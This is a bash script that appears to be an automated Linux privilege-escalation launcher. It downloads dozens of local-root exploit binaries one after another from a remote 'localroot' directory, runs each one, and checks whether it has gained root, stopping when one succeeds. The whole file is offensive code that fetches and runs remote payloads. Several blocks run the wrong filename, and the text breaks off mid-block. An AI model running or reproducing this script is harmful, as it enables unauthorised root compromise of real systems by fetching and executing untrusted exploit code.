#!/bin/bash

fcheckr00t()
{
	echo " [*] Downloading exploit No. $CNT.."
	if [ $(whoami) = 'root' ] 2> /dev/null
	then
		echo " [*] g0tr00t with exploit No. $CNT"
		GOTROOT=1
	else
		echo " [*] Failed to g0tr00t with exploit No. $CNT"
		CNT=$((CNT + 1))
	fi
}

fcheckdep()
{
	if [ $(which wget) -z ] 2> /dev/null
	then
		if [ $(which curl) -z ] 2> /dev/null
		then 
			echo ' [*] No downloaders found, try self-contained version..'
			exit
		else
			DLER='curl -s -o hisetup'
			CURLIT=1
		fi
	else
		DLER='wget -q'
		CURLIT=''
	fi
}


fcheckdep
CNT=1
GOTROOT=''
mkdir exploits
cd exploits

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/1-2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 1-2
		./1-2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/1-3
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 1-3
		./1-3
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/1-4
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 1-4
		./1-4
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-374.12.1.el5-2012
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-374.12.1.el5-2012
		./2.6.18-374.12.1.el5-2012
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/10
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 10
		./10
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/11
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 11
		./11
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/12
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 12
		./12
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/14
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 14
		./14
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/15.sh
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 15.sh
		./15.sh
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/15150
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 15150
		./15150
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/15200
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 15200
		./15200
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/16
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 16
		./16
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/16-1
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 16-1
		./16-1
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/18
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 18
		./18
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/18-5
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 18-5
		./18-5
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2
		./2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2-1
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-1
		./2-1
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2-6-32-46-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-6-32-46-2011
		./2-6-32-46-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2-6-37
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-6-37
		./2-6-37
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2-6-9-2005
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-6-9-2005
		./2-6-9-2005
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2-6-9-2006
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-6-9-2006
		./2-6-9-2006
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.34-2011Exploit1
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-6-9-2006
		./2-6-9-2006
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.4.21-2006
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2-6-9-2006
		./2-6-9-2006
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.4.36.92.6.27.5\ -\ 2008\ Local\ root
		./2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-164-2010
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-164-2010
		./2.6.18-164-2010
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-194
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-194
		./2.6.18-194
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-194.1-2010
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-194.1-2010
		./2.6.18-194.1-2010
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-194.2-2010
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-194.2-2010
		./2.6.18-194.2-2010
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-2011
		./2.6.18-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-274-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-274-2011
		./2.6.18-274-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.18-6-x86-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-6-x86-2011
		./2.6.18-6-x86-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.2-hoolyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.2-hoolyshit
		./2.6.2-hoolyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.20
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.20
		./2.6.20
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.20-2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.20-2
		./2.6.20-2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.22
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.22
		./2.6.22
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.22-2008
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.22-2008
		./2.6.22-2008
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.22-6-86_64-2007
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.22-6-86_64-2007
		./2.6.22-6-86_64-2007
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.23-2.6.24
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.23-2.6.24
		./2.6.23-2.6.24
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.23-2.6.24_2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.23-2.6.24_2
		./2.6.23-2.6.24_2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.23-2.6.27
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.23-2.6.27
		./2.6.23-2.6.27
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.24
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.24
		./2.6.24
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.27.7-generi
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.27.7-generi
		./2.6.27.7-generi
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.28-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.28-2011
		./2.6.28-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.32-46.1.BHsmp
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.32-46.1.BHsmp
		./2.6.32-46.1.BHsmp
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.33
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.33
		./2.6.33
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.33-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.18-2011
		./2.6.18-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.34-2011
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.34-2011
		./2.6.34-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.34-2011Exploit1
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.34-2011Exploit1
		./2.6.34-2011Exploit1
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.34-2011Exploit2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.34-2011Exploit2
		./2.6.34-2011Exploit2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.37
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.37
		./2.6.37
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.37-rc2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.37-rc2
		./2.6.37-rc2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.5_hoolyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.5_hoolyshit
		./2.6.5_hoolyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.6-34
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.6-34
		./2.6.6-34
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.6-34_h00lyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.6-34_h00lyshit
		./2.6.6-34_h00lyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.6_h00lyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.6_h00lyshit
		./2.6.6_h00lyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.7_h00lyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.7_h00lyshit
		./2.6.7_h00lyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.8-2008.9-67-2008
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.8-2008.9-67-2008
		./2.6.8-2008.9-67-2008
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.8-5_h00lyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.8-5_h00lyshit
		./2.6.8-5_h00lyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.8_h00lyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.8_h00lyshit
		./2.6.8_h00lyshit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9
		./2.6.9
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-2004
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-2004
		./2.6.9-2004
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-2008
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-2008
		./2.6.9-2008
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-34
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-34
		./2.6.9-34
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-42.0.3.ELsmp
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-42.0.3.ELsmp
		./2.6.9-42.0.3.ELsmp
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-42.0.3.ELsmp-2006
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-42.0.3.ELsmp-2006
		./2.6.9-42.0.3.ELsmp-2006
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-55
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-55
		./2.6.9-55
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-55-2007-prv8
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-55-2007-prv8
		./2.6.9-55-2007-prv8
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-55-2008-prv8
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-55-2008-prv8
		./2.6.9-55-2008-prv8
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9-672008
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9-672008
		./2.6.9-672008
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.9.2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.9.2
		./2.6.9.2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2.6.91-2007
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2.6.91-2007
		./2.6.91-2007
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2007
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2007
		./2007
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2009-local
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2009-local
		./2009-local
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2009-wunderbar
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2009-wunderbar
		./2009-wunderbar
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/2011\ LocalRoot\ For\ 2.6.18-128.el5
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 2011\ LocalRoot\ For\ 2.6.18-128.el5
		./2011\ LocalRoot\ For\ 2.6.18-128.el5
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/21
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 21
		./21
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/3
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 3
		./3
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/3.4.6-9-2007
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 3.4.6-9-2007
		./3.4.6-9-2007
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/31
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 31
		./31
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/36-rc1
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 36-rc1
		./36-rc1
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/4
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 4
		./4
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/44
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 44
		./44
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/47
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 47
		./47
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/5
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 5
		./5
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/50
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 50
		./50
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/54
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 54
		./54
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/6
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 6
		./6
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/67
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 67
		./67
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/7
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 7
		./7
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	if [ $CURLIT -z ] 2> /dev/null
	then
		$DLER http://bie.nazuka.net/localroot/7-2
		chmod 777 7-2
		./7-2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/7x
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 7x
		./7x
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/8
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 8
		./8
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/9
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 9
		./9
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/90
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 90
		./90
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/94
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 94
		./94
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER 'http://bie.nazuka.net/localroot/Linux_2.6(1).12'
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 Linux_2.6\(1\).12
		./Linux_2.6\(1\).12
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/Linux_2.6.12
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 Linux_2.6.12
		./Linux_2.6.12
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/Linux_2.6.9-joolyshit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 Linux_2.6.9-joolyshit
		./2.6.18-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/acid
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 acid
		./acid
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/d3vil
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 d3vil
		./d3vil
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/exp1
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 exp1
		./exp1
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/exp2
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 exp2
		./exp2
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
